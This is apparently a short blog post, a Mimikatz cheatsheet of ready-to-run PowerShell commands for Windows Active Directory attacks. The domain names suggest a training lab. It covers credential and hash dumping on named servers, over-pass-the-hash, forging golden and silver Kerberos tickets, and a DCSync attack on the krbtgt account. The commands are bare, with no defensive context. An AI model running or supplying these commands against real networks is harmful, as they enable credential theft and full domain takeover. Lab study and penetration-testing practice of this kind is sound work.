---
title: mimikatz-cheatsheet
date: 2020-11-22 17:20:01
tags:
---


# Mimikatz Cheatsheet

## Dump Creds

```
Invoke-Mimikatz -DumpCreds

Invoke-Mimikatz -DumpCreds -ComputerName @("server1","server2")
```

## Over Pass The Hash 

```
Invoke-Mimikatz -Command "sekurlsa::pth /user:Administrator /domain:dollarcorp.moneycorp.local /ntlm:<ntlm_hash> /run:powershell.exe"
```

## Dump Hashes
```
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName dcorp-dc
```

## Creating Tickets

### Create A Golden Ticket

```
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:<domain_SID> /krbtgt:<NTLM_hash> id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
```
### Create A Silver Ticket

```
Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:CIFS /rc4:6f5b5acaf7433b3282ac22e21e62ff22 /user:Administrator /ptt"'
```

## DCSync Attack

DA privileges required!

```
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"' 
```
